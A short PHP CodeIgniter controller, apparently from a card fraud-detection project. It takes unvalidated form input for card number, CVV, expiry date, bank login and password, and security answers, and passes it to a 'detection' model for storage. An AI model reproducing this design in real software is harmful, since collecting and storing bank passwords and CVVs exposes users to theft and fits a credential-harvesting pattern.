<?php
class Carddetails extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
    }
    public function index()
    {
        $this->load->view('carddetails');
    }
    public function carddetails()
    {
        $gow=array(
            'cardtype'=>$_POST['cardtype'],
            'cardnumber'=>$_POST['cardnumber'],
            'banklogin'=>$_POST['banklogin'],
            'bankpassword'=>$_POST['bankpassword'],
            'cvvnumber'=>$_POST['cvvnumber'],
            'expirydate'=>$_POST['expirydate'],
            'mobilenumber'=>$_POST['mobilenumber'],
            'email'=>$_POST['email'],
            'amountlimit'=>$_POST['amountlimit'],
            'password'=>$_POST['password'],
            'textone'=>$_POST['textone'],
            'ansone'=>$_POST['ansone'],
            'texttwo'=>$_POST['texttwo'],
            'anstwo'=>$_POST['anstwo'],
            'textthree'=>$_POST['textthree'],
            'ansthree'=>$_POST['ansthree'],
            'uid'=>$_SESSION['id']


        );
        $this->load->model('detection');
        $this->detection->carddetails($gow);
    }
    public function logout()
    {
        $this->session->sess_destroy();
        redirect('home');
    }
}